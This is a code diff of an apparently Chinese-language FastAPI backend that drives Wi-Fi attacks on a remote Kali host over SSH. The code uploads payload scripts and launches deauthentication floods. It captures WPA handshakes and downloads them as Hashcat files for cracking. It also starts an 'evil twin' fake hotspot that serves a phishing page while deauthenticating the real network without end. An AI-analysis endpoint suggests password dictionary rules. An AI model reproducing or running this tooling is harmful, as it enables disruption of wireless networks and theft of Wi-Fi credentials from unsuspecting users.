@@ -12,7 +12,7 @@ router = APIRouter()
 
 
 # ==========================================
-# 1. 请求模型定义
+# 1. 请求模型定义 (整合了所有参数)
 # ==========================================
 class AttackRequest(BaseModel):
     # 基础参数
@@ -22,9 +22,9 @@ class AttackRequest(BaseModel):
     duration: int = 60  # 攻击时长
 
     # --- Evil Twin (双子热点) 专用参数 ---
-    ap_interface: str = "wlan1"
-    ssid: str = "Free_WiFi"
-    template_html: str = ""
+    ap_interface: str = "wlan1"  # 发射热点的网卡
+    ssid: str = "Free_WiFi"  # 伪造的 WiFi 名称
+    template_html: str = ""  # 钓鱼页面 HTML 内容
 
 
 class AIAnalysisRequest(BaseModel):
@@ -34,29 +34,22 @@ class AIAnalysisRequest(BaseModel):
 
 
 # ==========================================
-# 2. 辅助工具：更强壮的路径查找
+# 2. 辅助工具：自动定位 Payload 脚本
 # ==========================================
 def find_payload_script(script_name: str):
-    """
-    更智能地查找 kali_payloads 脚本路径
-    """
+    """在项目目录中自动查找 kali_payloads 脚本路径"""
     current_file = Path(__file__).resolve()
-
-    # 定义可能的项目根目录位置
+    # 向上遍历寻找 kali_payloads 目录
+    # 兼容不同的部署目录结构
     search_paths = [
-        current_file.parents[5] / "kali_payloads" / script_name,  # 标准开发环境
+        current_file.parents[5] / "kali_payloads" / script_name,
         current_file.parents[4] / "kali_payloads" / script_name,
-        Path.cwd() / "kali_payloads" / script_name,  # 以此处运行目录为基准
-        Path.cwd().parent / "kali_payloads" / script_name,  # 上一级目录
-        Path("/app/kali_payloads") / script_name,  # Docker 常见路径
+        Path.cwd() / "kali_payloads" / script_name,
+        Path.cwd().parent / "kali_payloads" / script_name,
     ]
-
     for p in search_paths:
         if p.exists():
             return str(p)
-
-    # 如果都找不到，打印日志帮助调试
-    print(f"[!] Critical Error: Cannot find {script_name} in any of: {[str(p) for p in search_paths]}")
     return None
 
 
@@ -69,7 +62,7 @@ async def download_file(filename: str):
     if ".." in filename or "/" in filename:
         raise HTTPException(400, "Invalid filename")
 
-    # 尝试在 backend/captures 或当前目录寻找
+    # 尝试在多个位置查找 captures 目录
     possible_paths = [
         Path.cwd() / "captures" / filename,
         Path(__file__).resolve().parents[4] / "captures" / filename
@@ -88,90 +81,89 @@ async def download_file(filename: str):
 
 
 # ==========================================
-# 4. 核心攻击功能：Deauth
+# 4. 核心攻击功能：Deauth (独立模式)
 # ==========================================
 @router.post("/deauth")
 async def start_deauth_attack(req: AttackRequest):
+    """
+    启动普通的 Deauth 攻击 (非 Evil Twin 模式)
+    使用用户指定的 duration
+    """
     if not ssh_client.client:
         try:
             ssh_client.connect()
         except Exception as e:
-            raise HTTPException(500, f"SSH 连接失败: {str(e)}")
+            raise HTTPException(500, f"SSH连接失败: {str(e)}")
 
     script_name = "attack_worker.py"
     local_path = find_payload_script(script_name)
     if not local_path:
-        raise HTTPException(500, f"后端错误: 找不到本地脚本 {script_name}")
+        raise HTTPException(500, f"缺失 {script_name}，请检查 kali_payloads 目录")
 
     try:
         remote_path = ssh_client.upload_payload(local_path, script_name)
-        if not remote_path:
-            raise HTTPException(500, "文件上传到 Kali 失败")
-
         duration = int(req.duration)
-        # 加上 nohup 并在后台运行
+        # 后台执行，不阻塞
         cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
         ssh_client.exec_command(cmd)
-
         return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
     except Exception as e:
         raise HTTPException(500, f"执行异常: {str(e)}")
 
 
 # ==========================================
-# 5. 核心攻击功能：握手包捕获 (已修复超时与部署)
+# 5. 核心攻击功能：握手包捕获
 # ==========================================
 @router.post("/handshake")
 async def start_handshake_capture(req: AttackRequest):
+    """
+    启动握手包捕获流程：
+    1. 监听
+    2. 攻击
+    3. 校验握手包
+    4. 转换格式
+    """
     if not ssh_client.client: ssh_client.connect()
 
     script_name = "attack_worker.py"
     local_path = find_payload_script(script_name)
-    if not local_path:
-        raise HTTPException(500, f"无法定位 Payload: {script_name}，请检查项目目录结构")
+    if not local_path: raise HTTPException(500, f"本地找不到 {script_name}")
 
-    # 1. 部署/更新脚本到 Kali
     remote_path = ssh_client.upload_payload(local_path, script_name)
-    if not remote_path:
-        raise HTTPException(500, "SSH 上传脚本失败，请检查 Kali 磁盘空间或权限")
 
-    # 2. 构造命令
+    # 同步执行，等待结果
     cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"
 
     try:
-        # 【关键修复】
-        # timeout: 设为 duration + 25秒，给 SSH 连接和脚本启动留出余量
-        # get_pty=True: 强制分配伪终端，确保 stdout 能实时输出，并且 stdout.read() 不会因为缓冲而为空
-        timeout_val = int(req.duration) + 25
-        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=timeout_val, get_pty=True)
-
-        # 读取完整输出
+        stdin, stdout, stderr = ssh_client.exec_command(cmd)
         output = stdout.read().decode()
 
         response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}
 
-        # 3. 结果处理
-        # 确保本地 captures 目录存在
+        # 确定本地保存目录
         local_dir = Path.cwd() / "captures"
         if not local_dir.exists(): local_dir.mkdir(parents=True, exist_ok=True)
 
+        # 检查关键字，判断是否成功
         if "CAPTURED_HS_POTENTIAL" in output:
             remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"
             ts = int(time.time())
 
-            # A. 下载 .cap 文件
-            remote_cap = f"{remote_prefix}-01.cap"
-            local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"
+            # 下载 .cap / .pcap
+            for ext in ['.cap', '.pcap']:
+                remote_file = f"{remote_prefix}-01{ext}"
+                local_file = f"handshake_{req.bssid.replace(':', '')}_{ts}{ext}"
 
-            # 先检查远程文件是否存在
-            _in, _out, _err = ssh_client.exec_command(f"ls {remote_cap}")
-            if not _err.read():
-                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
-                    response_data["status"] = "success"
-                    response_data["msg"] = "成功捕获握手包"
-                    response_data["cap_file"] = local_cap
+                # 检查远程是否存在
+                _in, _out, _err = ssh_client.exec_command(f"ls {remote_file}")
+                if not _err.read():
+                    if ssh_client.download_file(remote_file, str(local_dir / local_file)):
+                        response_data["status"] = "success"
+                        response_data["msg"] = "成功捕获握手包"
+                        response_data["cap_file"] = local_file
+                        break
 
-            # B. 下载 Hashcat 文件 (如果有)
+            # 下载 Hashcat 文件 (.hc22000)
             remote_hc = f"{remote_prefix}.hc22000"
             local_hc = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"
             _in, _out, _err = ssh_client.exec_command(f"ls {remote_hc}")
@@ -182,9 +174,7 @@ async def start_handshake_capture(req: AttackRequest):
         return response_data
 
     except Exception as e:
-        # 捕获 SSH 超时或其他错误
-        print(f"[!] Handshake Error: {e}")
-        return {"status": "error", "msg": f"执行出错或超时: {str(e)}"}
+        return {"status": "error", "msg": str(e)}
 
 
 # ==========================================
@@ -195,9 +185,14 @@ async def analyze_target(req: AIAnalysisRequest):
     try:
         raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
         if isinstance(raw, dict) and "risk_level" in raw: return raw
-        return {"risk_level": "中", "summary": "Info", "advice": "Attempt handshake capture"}
-    except:
-        return {"risk_level": "Unknown"}
+        return {
+            "risk_level": "中 (Medium)",
+            "summary": "AI 服务暂未返回标准数据。",
+            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包。",
+            "dict_rules": ["纯数字", "手机号段"]
+        }
+    except Exception as e:
+        return {"risk_level": "Unknown", "summary": "Error", "advice": str(e), "dict_rules": []}
 
 
 # ==========================================
@@ -272,7 +267,6 @@ async def start_evil_twin(req: AttackRequest):
         deauth_cmd = f"nohup python3 {remote_deauth} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration 0 >> /tmp/et_deauth.log 2>&1 &"
         ssh_client.exec_command(deauth_cmd)
 
-        # 【恢复详细返回】这里恢复了你原来需要的详细信息
         return {
             "status": "started",
             "msg": "双子攻击已启动！Deauth 正在持续攻击目标，AP 已建立。",
